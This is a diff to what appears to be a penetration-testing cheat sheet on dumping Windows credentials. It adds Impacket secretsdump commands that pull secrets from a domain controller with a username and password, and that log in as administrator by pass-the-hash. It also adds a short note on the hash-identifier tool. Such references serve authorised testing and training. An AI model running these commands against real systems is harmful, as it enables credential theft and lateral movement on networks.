@@ -108,6 +108,20 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 Sections below allow us to dump credentials from Kali linux to Windows target.
 
+
+
+### Impacket's secretsdump&#x20;
+
+```bash
+impacket-secretsdump $DOMAIN.COM/$USER:$PASS@$DC_IP
+```
+
+```bash
+impacket-secretsdump administrator:@$IP -hashes $LM:$NT
+```
+
+
+
 ### CrackMapExec
 
 
@@ -174,13 +188,16 @@ msf> hashdump
 
 
 
-### Impacket's secretsdump&#x20;
+
+
+## Hash-Identify
+
+This is a tool that simplify the hash type detection
 
 ```bash
-impacket-secretsdump DOMAIN.COM/USER:PASS@DC_IP
+hash-identifier
+# paste your hash
 ```
-
-
 
 
 
